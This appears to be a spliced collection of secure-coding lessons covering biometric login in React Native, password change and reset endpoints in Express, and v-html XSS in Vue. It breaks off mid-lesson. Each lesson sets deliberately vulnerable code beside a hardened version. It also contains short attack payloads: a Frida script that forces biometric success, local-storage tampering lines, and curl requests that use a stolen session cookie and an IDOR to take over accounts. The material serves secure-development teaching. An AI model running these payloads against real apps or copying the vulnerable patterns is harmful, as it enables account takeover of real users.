```

**Additional Protections**:
- **Complete Audit Trail**: Every state transition is logged with timestamp, client IP, and metadata for forensic analysis
- **Explicit Next Steps**: API responses tell client what valid next actions are, preventing confusion and reducing attack surface exploration
- **Cryptographically Secure Session IDs**: 256-bit random tokens prevent session enumeration attacks
- **Idempotency**: Payment states handle retry scenarios without double-charging
- **Terminal States**: Failed/expired orders cannot be resumed, preventing manipulation of failed transactions

Biometric authentication is powerful but extremely dangerous if implemented incorrectly. Many apps make the critical mistake of trusting client-side biometric verification alone, which attackers can easily bypass.

**VULNERABLE CODE**:

```javascript
import React, { useState } from 'react';
import ReactNativeBiometrics from 'react-native-biometrics';
import AsyncStorage from '@react-native-async-storage/async-storage';

const BiometricLogin = ({ navigation }) => {
  const [isAuthenticated, setIsAuthenticated] = useState(false);

  const authenticateWithBiometrics = async () => {
    const rnBiometrics = new ReactNativeBiometrics();

    try {
      // VULNERABLE: Only checks client-side biometric result
      const { success } = await rnBiometrics.simplePrompt({
        promptMessage: 'Confirm fingerprint'
      });

      if (success) {
        // VULNERABLE: Sets local flag that can be manipulated
        await AsyncStorage.setItem('biometric_verified', 'true');
        setIsAuthenticated(true);

        // VULNERABLE: Grants access based solely on client-side check
        const userToken = await AsyncStorage.getItem('auth_token');
        navigation.navigate('Dashboard', { token: userToken });
      }
    } catch (error) {
      console.log('Biometric auth failed:', error);
    }
  };

  return (
    <TouchableOpacity onPress={authenticateWithBiometrics}>
      <Text>Login with Fingerprint</Text>
    </TouchableOpacity>
  );
};

export default BiometricLogin;
```

**Attack Payload** (using Frida or runtime manipulation):
```javascript
// Frida script to bypass biometric check
Java.perform(function() {
    var BiometricPrompt = Java.use('androidx.biometric.BiometricPrompt$AuthenticationCallback');
    BiometricPrompt.onAuthenticationSucceeded.implementation = function(result) {
        console.log('[*] Biometric bypassed - forcing success');
        this.onAuthenticationSucceeded(result);
    };
});

// Or simply manipulate AsyncStorage
await AsyncStorage.setItem('biometric_verified', 'true');
await AsyncStorage.setItem('auth_token', 'stolen_or_replayed_token');
```

**Why This Is Dangerous**:
- Client-side biometric verification can be hooked and bypassed using Frida, Objection, or similar tools
- AsyncStorage is not encrypted by default and can be read/modified on rooted/jailbroken devices
- No server-side verification means the backend trusts whatever the client sends
- Stored tokens without biometric binding can be replayed after extraction

**SECURE VERSION**:

```javascript
import React, { useState } from 'react';
import ReactNativeBiometrics from 'react-native-biometrics';
import * as Keychain from 'react-native-keychain';
import { Platform } from 'react-native';

const API_BASE = 'https://api.securebank.com';

const SecureBiometricLogin = ({ navigation }) => {
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState(null);

  const authenticateWithBiometrics = async () => {
    const rnBiometrics = new ReactNativeBiometrics({
      allowDeviceCredentials: false // Require actual biometrics, not PIN fallback
    });

    try {
      setIsLoading(true);
      setError(null);

      // Step 1: Check biometric availability and integrity
      const { available, biometryType } = await rnBiometrics.isSensorAvailable();
      if (!available) {
        throw new Error('Biometric authentication not available');
      }

      // Step 2: Request server challenge (prevents replay attacks)
      const challengeResponse = await fetch(`${API_BASE}/auth/biometric/challenge`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          deviceId: await getSecureDeviceId(),
          timestamp: Date.now()
        })
      });

      if (!challengeResponse.ok) {
        throw new Error('Failed to get authentication challenge');
      }

      const { challenge, challengeId, expiresAt } = await challengeResponse.json();

      // Step 3: Sign the challenge with biometric-protected key
      // This proves biometric verification happened AND binds to this device
      const { success, signature } = await rnBiometrics.createSignature({
        promptMessage: 'Authenticate to access your account',
        payload: challenge,
        cancelButtonText: 'Cancel'
      });

      if (!success || !signature) {
        throw new Error('Biometric verification failed');
      }

      // Step 4: Send signed challenge to server for verification
      const verifyResponse = await fetch(`${API_BASE}/auth/biometric/verify`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          challengeId: challengeId,
          signature: signature,
          deviceId: await getSecureDeviceId(),
          platform: Platform.OS,
          appVersion: '2.1.0'
        })
      });

      if (!verifyResponse.ok) {
        const errorData = await verifyResponse.json();
        throw new Error(errorData.message || 'Authentication failed');
      }

      const { sessionToken, expiresIn } = await verifyResponse.json();

      // Step 5: Store session token in secure enclave (hardware-backed)
      await Keychain.setGenericPassword('session', sessionToken, {
        accessControl: Keychain.ACCESS_CONTROL.BIOMETRY_CURRENT_SET,
        accessible: Keychain.ACCESSIBLE.WHEN_UNLOCKED_THIS_DEVICE_ONLY,
        securityLevel: Keychain.SECURITY_LEVEL.SECURE_HARDWARE
      });

      navigation.navigate('Dashboard');

    } catch (error) {
      console.error('Biometric auth error:', error.message);
      setError('Authentication failed. Please try again.');

      // Report potential attack to backend
      await reportAuthFailure(error.message);
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <TouchableOpacity 
      onPress={authenticateWithBiometrics}
      disabled={isLoading}
    >
      <Text>{isLoading ? 'Authenticating...' : 'Login with Fingerprint'}</Text>
      {error && <Text style={styles.error}>{error}</Text>}
    </TouchableOpacity>
  );
};

export default SecureBiometricLogin;
```

**Key Security Controls**:
- **Cryptographic binding**: Uses `createSignature()` with a hardware-backed private key that ONLY unlocks after successful biometric verification - the server verifies the signature, not the client's boolean result
- **Challenge-response protocol**: Server generates unique, time-limited challenges preventing replay attacks
- **Secure storage**: Uses Keychain with `BIOMETRY_CURRENT_SET` so enrolled biometric changes invalidate stored credentials
- **Server-side verification**: Backend validates the cryptographic signature using the registered public key, not trusting client assertions

Excellent questions! The enrollment phase is actually the most critical security boundary, and handling biometric changes is essential to prevent "evil maid" attacks where an attacker adds their fingerprint to access the victim's account.

**PRODUCTION PATTERN**:

```javascript
// ===== CLIENT SIDE: BiometricEnrollmentService.js =====
import ReactNativeBiometrics from 'react-native-biometrics';
import * as Keychain from 'react-native-keychain';
import DeviceInfo from 'react-native-device-info';
import { Platform } from 'react-native';

const API_BASE = 'https://api.securebank.com';

class BiometricEnrollmentService {
  constructor() {
    this.rnBiometrics = new ReactNativeBiometrics({
      allowDeviceCredentials: false
    });
  }

  async enrollBiometricKey(authToken) {
    try {
      // Step 1: Verify biometric hardware is available and secure
      const { available, biometryType } = await this.rnBiometrics.isSensorAvailable();
      if (!available) {
        throw new Error('BIOMETRIC_NOT_AVAILABLE');
      }

      // Step 2: Check for existing keys and delete if present (re-enrollment)
      const { keysExist } = await this.rnBiometrics.biometricKeysExist();
      if (keysExist) {
        await this.rnBiometrics.deleteKeys();
      }

      // Step 3: Generate new key pair in secure enclave
      // Private key NEVER leaves the device's hardware security module
      const { publicKey } = await this.rnBiometrics.createKeys();

      // Step 4: Get attestation to prove key is hardware-backed (Android)
      const deviceAttestation = await this.getDeviceAttestation();

      // Step 5: Generate unique device fingerprint
      const deviceFingerprint = await this.generateDeviceFingerprint();

      // Step 6: Register public key with server during authenticated session
      const response = await fetch(`${API_BASE}/auth/biometric/enroll`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${authToken}`, // Requires existing auth!
          'X-Device-Fingerprint': deviceFingerprint
        },
        body: JSON.stringify({
          publicKey: publicKey,
          biometryType: biometryType,
          deviceId: await DeviceInfo.getUniqueId(),
          deviceModel: DeviceInfo.getModel(),
          osVersion: DeviceInfo.getSystemVersion(),
          platform: Platform.OS,
          attestation: deviceAttestation,
          enrollmentTime: new Date().toISOString()
        })
      });

      if (!response.ok) {
        const error = await response.json();
        throw new Error(error.code || 'ENROLLMENT_FAILED');
      }

      const { keyId, enrollmentId } = await response.json();

      // Step 7: Store key ID locally for future reference
      await Keychain.setGenericPassword('biometric_key_id', keyId, {
        service: 'biometric_enrollment',
        accessible: Keychain.ACCESSIBLE.WHEN_UNLOCKED_THIS_DEVICE_ONLY
      });

      return { success: true, keyId, biometryType };

    } catch (error) {
      console.error('Biometric enrollment failed:', error);
      throw error;
    }
  }

  async getDeviceAttestation() {
    if (Platform.OS === 'android') {
      // Android Key Attestation proves key is in hardware
      try {
        const attestation = await this.rnBiometrics.getKeyAttestation();
        return attestation;
      } catch (e) {
        return null; // Handle gracefully, server decides if required
      }
    }
    // iOS uses Secure Enclave by default with DeviceCheck
    return null;
  }

  async generateDeviceFingerprint() {
    const components = [
      await DeviceInfo.getUniqueId(),
      DeviceInfo.getBrand(),
      DeviceInfo.getModel(),
      await DeviceInfo.getCarrier(),
      DeviceInfo.getSystemVersion()
    ];
    // Hash to prevent fingerprint spoofing
    return await this.sha256(components.join('|'));
  }

  async sha256(message) {
    const crypto = require('crypto');
    return crypto.createHash('sha256').update(message).digest('hex');
  }
}

export default new BiometricEnrollmentService();
```

```javascript
// ===== SERVER SIDE: biometricAuthController.js =====
const express = require('express');
const crypto = require('crypto');
const { verifySignature } = require('./cryptoUtils');
const { rateLimiter } = require('./middleware/rateLimiter');
const { verifyJWT } = require('./middleware/auth');
const BiometricKey = require('./models/BiometricKey');
const AuditLog = require('./models/AuditLog');
const alertService = require('./services/alertService');

const router = express.Router();

// Challenge store with TTL (use Redis in production)
const challengeStore = new Map();
const CHALLENGE_TTL_MS = 60000; // 1 minute

// Enrollment endpoint - requires existing authentication
router.post('/biometric/enroll',
  verifyJWT, // Must be logged in with password/MFA first
  rateLimiter({ windowMs: 3600000, max: 3 }), // 3 enrollments per hour
  async (req, res) => {
    const { publicKey, biometryType, deviceId, deviceModel, osVersion, platform, attestation } = req.body;
    const userId = req.user.id;

    try {
      // Validate public key format
      if (!isValidPublicKey(publicKey)) {
        return res.status(400).json({ code: 'INVALID_PUBLIC_KEY' });
      }

      // Verify attestation if provided (Android)
      if (platform === 'android' && attestation) {
        const attestationValid = await verifyKeyAttestation(attestation, publicKey);
        if (!attestationValid) {
          await AuditLog.create({
            userId,
            event: 'BIOMETRIC_ATTESTATION_FAILED',
            severity: 'HIGH',
            details: { deviceId, deviceModel }
          });
          return res.status(400).json({ code: 'ATTESTATION_FAILED' });
        }
      }

      // Check for existing biometric keys and handle migration
      const existingKeys = await BiometricKey.find({ userId, isActive: true });
      if (existingKeys.length >= 3) {
        return res.status(400).json({ 
          code: 'MAX_DEVICES_REACHED',
          message: 'Maximum 3 biometric devices allowed'
        });
      }

      // Generate unique key ID
      const keyId = crypto.randomUUID();

      // Store public key with device binding
      const biometricKey = await BiometricKey.create({
        keyId,
        userId,
        publicKey,
        deviceId,
        deviceModel,
        osVersion,
        platform,
        biometryType,
        enrolledAt: new Date(),
        lastUsedAt: null,
        isActive: true,
        failedAttempts: 0,
        // Store hash of biometric set for change detection
        biometricSetHash: await getBiometricSetHash(deviceId)
      });

      // Audit log
      await AuditLog.create({
        userId,
        event: 'BIOMETRIC_ENROLLED',
        severity: 'INFO',
        details: {
          keyId,
          deviceModel,
          biometryType,
          ip: req.ip
        }
      });

      // Notify user of new device enrollment
      await notifyUserNewDevice(userId, deviceModel, biometryType);

      res.json({
        keyId,
        enrollmentId: biometricKey._id,
        message: 'Biometric enrollment successful'
      });

    } catch (error) {
      console.error('Enrollment error:', error);
      res.status(500).json({ code: 'ENROLLMENT_ERROR' });
    }
  }
);

// Generate challenge for authentication
router.post('/biometric/challenge',
  rateLimiter({ windowMs: 60000, max: 10 }), // 10 challenges per minute
  async (req, res) => {
    const { deviceId, timestamp } = req.body;

    try {
      // Check if device has enrolled biometric key
      const biometricKey = await BiometricKey.findOne({
        deviceId,
        isActive: true
      });

      if (!biometricKey) {
        // Don't reveal if device is enrolled or not
        return res.status(401).json({ code: 'AUTH_REQUIRED' });
      }

      // Check for account lockout
      if (biometricKey.failedAttempts >= 5) {
        const lockoutEnd = new Date(biometricKey.lastFailedAt.getTime() + 30 * 60000);
        if (new Date() < lockoutEnd) {
          return res.status(429).json({
            code: 'ACCOUNT_LOCKED',
            retryAfter: Math.ceil((lockoutEnd - new Date()) / 1000)
          });
        }
        // Reset after lockout period
        biometricKey.failedAttempts = 0;
        await biometricKey.save();
      }

      // Generate cryptographically secure challenge
      const challenge = crypto.randomBytes(32).toString('base64');
      const challengeId = crypto.randomUUID();
      const expiresAt = new Date(Date.now() + CHALLENGE_TTL_MS);

      // Store challenge with metadata
      challengeStore.set(challengeId, {
        challenge,
        deviceId,
        keyId: biometricKey.keyId,
        userId: biometricKey.userId,
        expiresAt,
        used: false
      });

      // Cleanup expired challenges
      setTimeout(() => challengeStore.delete(challengeId), CHALLENGE_TTL_MS);

      res.json({
        challenge,
        challengeId,
        expiresAt: expiresAt.toISOString()
      });

    } catch (error) {
      console.error('Challenge generation error:', error);
      res.status(500).json({ code: 'SERVER_ERROR' });
    }
  }
);

// Verify biometric signature
router.post('/biometric/verify',
  rateLimiter({ windowMs: 60000, max: 5 }), // 5 attempts per minute
  async (req, res) => {
    const { challengeId, signature, deviceId, platform, appVersion } = req.body;

    try {
      // Retrieve and validate challenge
      const challengeData = challengeStore.get(challengeId);

      if (!challengeData) {
        await AuditLog.create({
          event: 'INVALID_CHALLENGE_ID',
          severity: 'MEDIUM',
          details: { deviceId, ip: req.ip }
        });
        return res.status(401).json({ code: 'INVALID_CHALLENGE' });
      }

      // Check challenge expiry
      if (new Date() > challengeData.expiresAt) {
        challengeStore.delete(challengeId);
        return res.status(401).json({ code: 'CHALLENGE_EXPIRED' });
      }

      // Prevent challenge reuse
      if (challengeData.used) {
        await alertService.sendSecurityAlert({
          type: 'CHALLENGE_REUSE_ATTEMPT',
          deviceId,
          severity: 'HIGH'
        });
        return res.status(401).json({ code: 'CHALLENGE_ALREADY_USED' });
      }

      // Verify device binding
      if (challengeData.deviceId !== deviceId) {
        await AuditLog.create({
          event: 'DEVICE_MISMATCH',
          severity: 'HIGH',
          details: { expected: challengeData.deviceId, received: deviceId }
        });
        return res.status(401).json({ code: 'DEVICE_MISMATCH' });
      }

      // Get stored public key
      const biometricKey = await BiometricKey.findOne({
        keyId: challengeData.keyId,
        isActive: true
      });

      if (!biometricKey) {
        return res.status(401).json({ code: 'KEY_NOT_FOUND' });
      }

      // CRITICAL: Check if biometric set has changed (new fingerprint added)
      const currentBiometricHash = await getBiometricSetHash(deviceId);
      if (currentBiometricHash !== biometricKey.biometricSetHash) {
        // Biometric enrollment changed - require re-authentication
        biometricKey.isActive = false;
        await biometricKey.save();

        await AuditLog.create({
          userId: biometricKey.userId,
          event: 'BIOMETRIC_SET_CHANGED',
          severity: 'HIGH',
          details: { deviceId, keyId: biometricKey.keyId }
        });

        await alertService.notifyUser(biometricKey.userId, {
          title: 'Biometric Change Detected',
          message: 'A new fingerprint was detected. Please re-enroll biometrics.'
        });

        return res.status(401).json({
          code: 'BIOMETRIC_CHANGED',
          message: 'Biometric set has changed. Re-enrollment required.'
        });
      }

      // Verify cryptographic signature
      const isValid = verifySignature(
        challengeData.challenge,
        signature,
        biometricKey.publicKey
      );

      // Mark challenge as used regardless of result
      challengeData.used = true;

      if (!isValid) {
        biometricKey.failedAttempts += 1;
        biometricKey.lastFailedAt = new Date();
        await biometricKey.save();

        await AuditLog.create({
          userId: biometricKey.userId,
          event: 'BIOMETRIC_VERIFY_FAILED',
          severity: 'MEDIUM',
          details: { deviceId, attempts: biometricKey.failedAttempts }
        });

        if (biometricKey.failedAttempts >= 5) {
          await alertService.sendSecurityAlert({
            userId: biometricKey.userId,
            type: 'BIOMETRIC_LOCKOUT',
            severity: 'HIGH'
          });
        }

        return res.status(401).json({ code: 'SIGNATURE_INVALID' });
      }

      // Success! Reset failed attempts and update last used
      biometricKey.failedAttempts = 0;
      biometricKey.lastUsedAt = new Date();
      await biometricKey.save();

      // Generate session token
      const sessionToken = await generateSecureSessionToken(biometricKey.userId, {
        deviceId,
        authMethod: 'biometric',
        keyId: biometricKey.keyId
      });

      await AuditLog.create({
        userId: biometricKey.userId,
        event: 'BIOMETRIC_LOGIN_SUCCESS',
        severity: 'INFO',
        details: { deviceId, ip: req.ip }
      });

      res.json({
        sessionToken,
        expiresIn: 3600,
        userId: biometricKey.userId
      });

    } catch (error) {
      console.error('Verification error:', error);
      res.status(500).json({ code: 'VERIFICATION_ERROR' });
    }
  }
);

function isValidPublicKey(publicKey) {
  try {
    crypto.createPublicKey({
      key: Buffer.from(publicKey, 'base64'),
      format: 'der',
      type: 'spki'
    });
    return true;
  } catch {
    return false;
  }
}

module.exports = router;
```

**Defense in Depth Layers**:

1. **Cryptographic Proof of Biometric Verification**:
```javascript
// Private key in secure enclave can ONLY be used after biometric success
const { success, signature } = await rnBiometrics.createSignature({
  promptMessage: 'Authenticate',
  payload: serverChallenge // Server-provided, single-use
});
// If biometric fails, signature is impossible to generate
```

2. **Biometric Set Change Detection**:
```javascript
// Client uses BIOMETRY_CURRENT_SET access control
await Keychain.setGenericPassword('key', value, {
  accessControl: Keychain.ACCESS_CONTROL.BIOMETRY_CURRENT_SET
  // Key invalidated if ANY fingerprint added/removed
});

// Server tracks biometric hash from client attestation
if (currentBiometricHash !== storedBiometricHash) {
  // Force re-enrollment with password auth
  biometricKey.isActive = false;
}
```

3. **Device Binding and Attestation**:
```javascript
// Android: Verify key is hardware-backed via SafetyNet/Play Integrity
const attestationValid = await verifyKeyAttestation(attestation, publicKey);
// iOS: Keys in Secure Enclave by default with proper entitlements
// DeviceCheck API provides additional device integrity verification
```

**Additional Protections**:

- **Rate limiting**: Strict limits on challenge requests and verification attempts to prevent brute force
- **Challenge expiry**: 60-second TTL prevents replay attacks and reduces attack window
- **Account lockout**: 5 failed attempts triggers 30-minute lockout with security team alert
- **Audit logging**: Every enrollment, verification, and failure logged for forensic analysis
- **User notifications**: Email/push notification on new device enrollment or biometric changes
- **Maximum device limit**: 3 enrolled devices per user prevents unlimited enrollment attacks
- **Session binding**: Tokens bound to device ID and authentication method for anomaly detection

Password change functionality is a critical security control that attackers frequently target. A common vulnerability is allowing password changes without verifying the current password, which enables account takeover if an attacker gains temporary access to a session.

**VULNERABLE CODE**:

```javascript
const express = require('express');
const bcrypt = require('bcrypt');
const pool = require('./db');

const app = express();
app.use(express.json());

// VULNERABLE: No current password verification
app.post('/api/change-password', async (req, res) => {
  const { userId, newPassword } = req.body;

  // Only checks if user is "logged in" via session
  if (!req.session.userId) {
    return res.status(401).json({ error: 'Not authenticated' });
  }

  // VULNERABILITY 1: No current password verification
  // VULNERABILITY 2: Allows changing ANY user's password if userId is provided
  const targetUserId = userId || req.session.userId;

  const hashedPassword = await bcrypt.hash(newPassword, 10);

  await pool.query(
    'UPDATE users SET password = $1 WHERE id = $2',
    [hashedPassword, targetUserId]
  );

  res.json({ message: 'Password changed successfully' });
});
```

**Attack Payload**:
```bash
# Attacker with stolen session cookie changes victim's password
curl -X POST https://target.com/api/change-password \
  -H "Cookie: session=stolen_session_token" \
  -H "Content-Type: application/json" \
  -d '{"newPassword": "attacker_password123"}'

# Or change another user's password via IDOR
curl -X POST https://target.com/api/change-password \
  -H "Cookie: session=valid_attacker_session" \
  -H "Content-Type: application/json" \
  -d '{"userId": 1, "newPassword": "admin_takeover"}'
```

**Why This Is Dangerous**:
- Session hijacking via XSS, network sniffing, or malware allows immediate account takeover
- No re-authentication means stolen sessions have unlimited power
- IDOR vulnerability allows horizontal privilege escalation to any user
- No audit trail of password changes for forensic investigation

**SECURE VERSION**:

```javascript
const express = require('express');
const bcrypt = require('bcrypt');
const { body, validationResult } = require('express-validator');
const pool = require('./db');
const rateLimit = require('express-rate-limit');

const app = express();
app.use(express.json());

// Rate limiting for password changes
const passwordChangeLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 3, // 3 attempts per window
  message: { error: 'Too many password change attempts' }
});

// SECURE: Requires current password verification
app.post('/api/change-password',
  passwordChangeLimiter,
  [
    body('currentPassword').notEmpty().withMessage('Current password required'),
    body('newPassword')
      .isLength({ min: 12 })
      .withMessage('Password must be at least 12 characters')
      .matches(/^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@$!%*?&])/)
      .withMessage('Password must include uppercase, lowercase, number, and special character'),
    body('confirmPassword').custom((value, { req }) => {
      if (value !== req.body.newPassword) {
        throw new Error('Passwords do not match');
      }
      return true;
    })
  ],
  async (req, res) => {
    const errors = validationResult(req);
    if (!errors.isEmpty()) {
      return res.status(400).json({ errors: errors.array() });
    }

    // SECURITY: Only allow changing own password from session
    if (!req.session.userId) {
      return res.status(401).json({ error: 'Not authenticated' });
    }

    const { currentPassword, newPassword } = req.body;
    const userId = req.session.userId; // NEVER from request body

    try {
      // Fetch current password hash
      const result = await pool.query(
        'SELECT password FROM users WHERE id = $1',
        [userId]
      );

      if (result.rows.length === 0) {
        return res.status(404).json({ error: 'User not found' });
      }

      // CRITICAL: Verify current password
      const validPassword = await bcrypt.compare(
        currentPassword,
        result.rows[0].password
      );

      if (!validPassword) {
        // Log failed attempt
        console.log(`Failed password change attempt for user ${userId}`);
        return res.status(401).json({ error: 'Current password incorrect' });
      }

      // Hash and update new password
      const hashedPassword = await bcrypt.hash(newPassword, 12);

      await pool.query(
        'UPDATE users SET password = $1, password_changed_at = NOW() WHERE id = $2',
        [hashedPassword, userId]
      );

      // Invalidate all other sessions
      await pool.query(
        'DELETE FROM sessions WHERE user_id = $1 AND session_id != $2',
        [userId, req.session.id]
      );

      // Log successful change
      console.log(`Password changed successfully for user ${userId}`);

      res.json({ message: 'Password changed successfully' });
    } catch (error) {
      console.error('Password change error:', error);
      res.status(500).json({ error: 'Internal server error' });
    }
  }
);
```

**Key Security Controls**:
- **Current password verification**: Re-authenticates user before allowing password change, preventing session hijacking attacks
- **No user ID from request body**: Only uses session user ID, preventing IDOR attacks
- **Rate limiting**: Prevents brute force attempts against current password
- **Session invalidation**: Logs out all other sessions after password change
- **Strong password policy**: Enforces complexity requirements

Password reset flows are even more critical because they bypass normal authentication entirely. Poor implementations lead to account takeovers via predictable tokens, token leakage, or lack of expiration.

**PRODUCTION PATTERN**:

```javascript
const express = require('express');
const crypto = require('crypto');
const bcrypt = require('bcrypt');
const { body, validationResult } = require('express-validator');
const pool = require('./db');
const rateLimit = require('express-rate-limit');
const nodemailer = require('nodemailer');

const app = express();
app.use(express.json());

// Configuration
const TOKEN_EXPIRY_MINUTES = 15;
const MAX_RESET_ATTEMPTS = 3;

// Strict rate limiting for reset requests
const resetRequestLimiter = rateLimit({
  windowMs: 60 * 60 * 1000, // 1 hour
  max: 3,
  keyGenerator: (req) => req.body.email || req.ip,
  handler: (req, res) => {
    console.warn(`Rate limit exceeded for reset: ${req.body.email || req.ip}`);
    // Return same response to prevent enumeration
    res.json({ message: 'If the email exists, a reset link has been sent' });
  }
});

const resetSubmitLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 5,
  message: { error: 'Too many attempts. Please request a new reset link.' }
});

// STEP 1: Request password reset
app.post('/api/forgot-password',
  resetRequestLimiter,
  body('email').isEmail().normalizeEmail(),
  async (req, res) => {
    const errors = validationResult(req);
    if (!errors.isEmpty()) {
      // Return generic response to prevent enumeration
      return res.json({ message: 'If the email exists, a reset link has been sent' });
    }

    const { email } = req.body;

    try {
      // Check if user exists (timing-safe)
      const userResult = await pool.query(
        'SELECT id, email FROM users WHERE email = $1',
        [email]
      );

      // SECURITY: Always return same response regardless of user existence
      const genericResponse = { message: 'If the email exists, a reset link has been sent' };

      if (userResult.rows.length === 0) {
        // Simulate processing time to prevent timing attacks
        await new Promise(resolve => setTimeout(resolve, 100 + Math.random() * 100));
        return res.json(genericResponse);
      }

      const user = userResult.rows[0];

      // Generate cryptographically secure token
      const resetToken = crypto.randomBytes(32).toString('hex');
      const tokenHash = crypto
        .createHash('sha256')
        .update(resetToken)
        .digest('hex');

      // Store hashed token with expiry
      const expiresAt = new Date(Date.now() + TOKEN_EXPIRY_MINUTES * 60 * 1000);

      await pool.query(
        `INSERT INTO password_resets (user_id, token_hash, expires_at, attempts, created_at)
         VALUES ($1, $2, $3, 0, NOW())
         ON CONFLICT (user_id) DO UPDATE 
         SET token_hash = $2, expires_at = $3, attempts = 0, created_at = NOW()`,
        [user.id, tokenHash, expiresAt]
      );

      // Send email with unhashed token
      const resetUrl = `https://yourapp.com/reset-password?token=${resetToken}&email=${encodeURIComponent(email)}`;

      await sendResetEmail(email, resetUrl);

      // Audit log
      console.log(`Password reset requested for user ${user.id} from ${req.ip}`);

      res.json(genericResponse);
    } catch (error) {
      console.error('Password reset request error:', error);
      res.json({ message: 'If the email exists, a reset link has been sent' });
    }
  }
);

// STEP 2: Validate token and reset password
app.post('/api/reset-password',
  resetSubmitLimiter,
  [
    body('token').isLength({ min: 64, max: 64 }).isHexadecimal(),
    body('email').isEmail().normalizeEmail(),
    body('newPassword')
      .isLength({ min: 12 })
      .matches(/^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@$!%*?&])/),
    body('confirmPassword').custom((value, { req }) => {
      if (value !== req.body.newPassword) {
        throw new Error('Passwords do not match');
      }
      return true;
    })
  ],
  async (req, res) => {
    const errors = validationResult(req);
    if (!errors.isEmpty()) {
      return res.status(400).json({ error: 'Invalid request' });
    }

    const { token, email, newPassword } = req.body;

    try {
      // Hash the provided token for comparison
      const tokenHash = crypto
        .createHash('sha256')
        .update(token)
        .digest('hex');

      // Find valid reset record
      const resetResult = await pool.query(
        `SELECT pr.id, pr.user_id, pr.attempts, u.email
         FROM password_resets pr
         JOIN users u ON u.id = pr.user_id
         WHERE pr.token_hash = $1 
         AND u.email = $2
         AND pr.expires_at > NOW()
         AND pr.attempts < $3`,
        [tokenHash, email, MAX_RESET_ATTEMPTS]
      );

      if (resetResult.rows.length === 0) {
        // Increment attempt counter if record exists
        await pool.query(
          `UPDATE password_resets SET attempts = attempts + 1 
           WHERE token_hash = $1`,
          [tokenHash]
        );

        console.warn(`Invalid password reset attempt for ${email} from ${req.ip}`);
        return res.status(400).json({ error: 'Invalid or expired reset link' });
      }

      const resetRecord = resetResult.rows[0];

      // Check if new password was previously used
      const previousPasswords = await pool.query(
        'SELECT password_hash FROM password_history WHERE user_id = $1 ORDER BY created_at DESC LIMIT 5',
        [resetRecord.user_id]
      );

      for (const prev of previousPasswords.rows) {
        if (await bcrypt.compare(newPassword, prev.password_hash)) {
          return res.status(400).json({ error: 'Cannot reuse recent passwords' });
        }
      }

      // Hash new password
      const hashedPassword = await bcrypt.hash(newPassword, 12);

      // Begin transaction
      const client = await pool.connect();
      try {
        await client.query('BEGIN');

        // Update password
        await client.query(
          'UPDATE users SET password = $1, password_changed_at = NOW() WHERE id = $2',
          [hashedPassword, resetRecord.user_id]
        );

        // Store in password history
        await client.query(
          'INSERT INTO password_history (user_id, password_hash, created_at) VALUES ($1, $2, NOW())',
          [resetRecord.user_id, hashedPassword]
        );

        // Delete reset token
        await client.query(
          'DELETE FROM password_resets WHERE user_id = $1',
          [resetRecord.user_id]
        );

        // Invalidate ALL sessions for this user
        await client.query(
          'DELETE FROM sessions WHERE user_id = $1',
          [resetRecord.user_id]
        );

        await client.query('COMMIT');

        // Audit log
        console.log(`Password reset completed for user ${resetRecord.user_id} from ${req.ip}`);

        // Send notification email
        await sendPasswordChangedNotification(email);

        res.json({ message: 'Password has been reset successfully' });
      } catch (error) {
        await client.query('ROLLBACK');
        throw error;
      } finally {
        client.release();
      }
    } catch (error) {
      console.error('Password reset error:', error);
      res.status(500).json({ error: 'Internal server error' });
    }
  }
);

// Helper: Send reset email
async function sendResetEmail(email, resetUrl) {
  const transporter = nodemailer.createTransport({
    host: process.env.SMTP_HOST,
    port: 587,
    secure: false,
    auth: {
      user: process.env.SMTP_USER,
      pass: process.env.SMTP_PASS
    }
  });

  await transporter.sendMail({
    from: '"Security" <security@yourapp.com>',
    to: email,
    subject: 'Password Reset Request',
    html: `
      <p>A password reset was requested for your account.</p>
      <p>Click <a href="${resetUrl}">here</a> to reset your password.</p>
      <p>This link expires in ${TOKEN_EXPIRY_MINUTES} minutes.</p>
      <p>If you didn't request this, please ignore this email and consider enabling 2FA.</p>
    `
  });
}

// Helper: Send password changed notification
async function sendPasswordChangedNotification(email) {
  // Implementation similar to above
  // Alerts user that password was changed
}
```

**Defense in Depth Layers**:

1. **Cryptographically secure tokens**: Uses `crypto.randomBytes(32)` for 256-bit entropy, stored hashed in database
```javascript
const resetToken = crypto.randomBytes(32).toString('hex');
const tokenHash = crypto.createHash('sha256').update(resetToken).digest('hex');
```

2. **Time-limited tokens with attempt limiting**: Tokens expire in 15 minutes with max 3 attempts
```javascript
AND pr.expires_at > NOW()
AND pr.attempts < $3
```

3. **User enumeration prevention**: Same response and timing regardless of user existence
```javascript
await new Promise(resolve => setTimeout(resolve, 100 + Math.random() * 100));
return res.json(genericResponse);
```

**Additional Protections**:
- **Password history check**: Prevents reuse of last 5 passwords
- **Session invalidation**: All sessions terminated on password reset
- **Notification email**: User alerted when password is changed
- **Transaction safety**: Database operations are atomic
- **Rate limiting**: Separate limits for request and submission endpoints
- **Token stored hashed**: Even database compromise doesn't leak valid tokens
- **Email + token validation**: Both must match for successful reset

Directly rendering user-controlled HTML in Vue 3 with `v-html` is very risky, especially if the sanitization is incomplete or home-grown. This can easily lead to XSS.

**VULNERABLE CODE**:

```typescript
// src/components/CommentList.vue
<script lang="ts" setup>
import { ref, onMounted } from 'vue';

interface Comment {
  id: number;
  author: string;
  // "content" comes from untrusted users (e.g., form input, API)
  content: string;
}

const comments = ref<Comment[]>([]);

// Naive "sanitizer" that only strips <script> tags using a regex
function naiveSanitize(html: string): string {
  // ⚠ This does NOT remove all possible script execution vectors
  return html.replace(/<script[\s\S]*?>[\s\S]*?<\/script>/gi, '');
}

onMounted(async () => {
  const res = await fetch('/api/comments');
  const data = await res.json();
  // Apply naive sanitizer and trust the result
  comments.value = data.map((c: Comment) => ({
    ...c,
    content: naiveSanitize(c.content)
  }));
});
</script>

<template>
  <div class="comments">
    <article v-for="c in comments" :key="c.id" class="comment">
      <h3>{{ c.author }}</h3>
